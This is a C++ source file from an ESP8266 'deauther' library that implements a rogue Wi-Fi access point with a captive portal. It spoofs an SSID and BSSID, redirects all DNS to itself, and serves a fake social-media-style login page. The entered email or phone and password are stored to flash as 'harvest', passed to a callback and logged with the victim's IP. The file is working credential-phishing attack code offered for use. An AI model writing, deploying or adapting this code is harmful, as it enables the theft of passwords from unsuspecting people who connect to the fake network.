/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License */

#include "DeautherRogueAP.h"
#include "../storage/DeautherStorage.h"
#include "../utils/DeautherMac.h"
#include "../utils/DeautherStrHelper.h"

// ═══════════════════════════════════════════════════════════════════════════════
// Default HTML — Social Media / Free Wi-Fi Login Portal
// ═══════════════════════════════════════════════════════════════════════════════
static const char RAP_DEFAULT_HTML[] PROGMEM = R"html(
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>%TITLE%</title>
<style>
body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}
h2{color:#1c1e21;margin-bottom:10px}
p{color:#606770;margin-bottom:20px;font-size:14px}
input{width:100%;padding:12px;margin-bottom:15px;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:16px}
input:focus{outline:none;border-color:#1877f2}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
</style>
</head>
<body>
<div class="box">
  <h2>Welcome to %SSID%</h2>
  <p>Please log in or register to access free high-speed internet.</p>
  <form id="loginForm" onsubmit="return submitData(event)">
    <input type="text" name="username" placeholder="Email or Phone Number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
</div>
<script>
function submitData(e){
  e.preventDefault();
  if(window.DeautherAPI) {
    DeautherAPI.submitForm('loginForm').then(function(){
      DeautherAPI.redirect('/success');
    });
  }
  return false;
}
</script>
</body>
</html>
)html";

static const char RAP_SUCCESS_HTML[] PROGMEM = R"html(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Success</title><style>body{font-family:sans-serif;text-align:center;padding:50px;color:#333}h1{color:#4CAF50}</style></head><body><h1>Connection Successful</h1><p>You can now browse the internet.</p></body></html>
)html";

// JS API Bridge
static const char RAP_JS_API[] PROGMEM = R"js(
<script>
(function(){
  window.DeautherAPI = {
    submit: function(data) {
      return fetch('/api/submit', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) }).then(r=>r.json());
    },
    submitForm: function(id) {
      var f = document.getElementById(id); if(!f) return Promise.reject();
      var d = {}; for(var i=0;i<f.elements.length;i++) if(f.elements[i].name) d[f.elements[i].name] = f.elements[i].value;
      return this.submit(d);
    },
    redirect: function(url){ window.location = url; }
  };
})();
</script>
)js";

// ═══════════════════════════════════════════════════════════════════════════════

DeautherRogueAP::DeautherRogueAP() {}
DeautherRogueAP::~DeautherRogueAP() { stop(); }

void DeautherRogueAP::start(const RogueAPConfig& cfg) {
    stop();
    _cfg = cfg;
    if (!_cfg.ssid) _cfg.ssid = "Free WiFi";

    if (!DMac::isNull(_cfg.bssid)) wifi_set_macaddr(SOFTAP_IF, (uint8_t*)_cfg.bssid);

    WiFi.mode(WIFI_AP);
    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(_cfg.ssid, _cfg.password, _cfg.channel, _cfg.hidden);

    _dns = new DNSServer();
    _dns->setErrorReplyCode(DNSReplyCode::NoError);
    _dns->start(53, "*", apIP);

    _server = new ESP8266WebServer(80);
    _setupServer();
    _server->begin();
    
    _running = true;
    DStorage::begin(); // Init SPIFFS
    Serial.print(F("[RogueAP] Started: ")); Serial.println(_cfg.ssid);
}

void DeautherRogueAP::start(const char* ssid) {
    RogueAPConfig cfg; cfg.ssid = ssid; start(cfg);
}

void DeautherRogueAP::stop() {
    if (!_running) return;
    if (_server) { _server->stop(); delete _server; _server = nullptr; }
    if (_dns)    { _dns->stop(); delete _dns; _dns = nullptr; }
    WiFi.softAPdisconnect(true);
    _running = false;
    Serial.println(F("[RogueAP] Stopped"));
}

void DeautherRogueAP::update() {
    if (!_running) return;
    if (_dns) _dns->processNextRequest();
    if (_server) _server->handleClient();
}

bool DeautherRogueAP::isRunning() const { return _running; }

void DeautherRogueAP::onDataReceived(DataCb cb) { _data_cb = cb; }

// Internal

String DeautherRogueAP::_injectJsApi(const String& html) const {
    if (!_cfg.injectJsApi) return html;
    String js = FPSTR(RAP_JS_API);
    int idx = html.indexOf(F("</body>"));
    return (idx >= 0) ? html.substring(0, idx) + js + html.substring(idx) : html + js;
}

void DeautherRogueAP::_setupServer() {
    _server->on("/", [this]() { _handleRoot(); });
    _server->on("/success", [this]() {
        _server->send(200, "text/html", _cfg.successHtml ? String(_cfg.successHtml) : FPSTR(RAP_SUCCESS_HTML));
    });
    _server->on("/api/submit", HTTP_POST, [this]() { _handleApiSubmit(); });
    // Captive checks
    _server->onNotFound([this]() { _handleNotFound(); });
}

void DeautherRogueAP::_handleRoot() {
    String html = _cfg.customHtml ? String(_cfg.customHtml) : FPSTR(RAP_DEFAULT_HTML);
    html.replace("%SSID%", String(_cfg.ssid));
    html.replace("%TITLE%", String(_cfg.portalTitle));
    _server->send(200, "text/html", _injectJsApi(html));
}

void DeautherRogueAP::_handleApiSubmit() {
    String body = _server->arg("plain");
    if (body.isEmpty()) body = "{}";

    String ip = _server->client().remoteIP().toString();
    
    // Save to flash via storage API
    DStorage::saveData("harvest", body);
    
    // Trigger callback
    if (_data_cb) _data_cb("harvest", body, ip.c_str());

    Serial.print(F("[RogueAP] Harvested from ")); Serial.print(ip);
    Serial.print(F(": ")); Serial.println(body);

    _server->send(200, "application/json", "{\"ok\":true}");
}

void DeautherRogueAP::_handleNotFound() {
    _server->sendHeader("Location", "http://192.168.4.1/", true);
    _server->send(302, "text/plain", "");
}
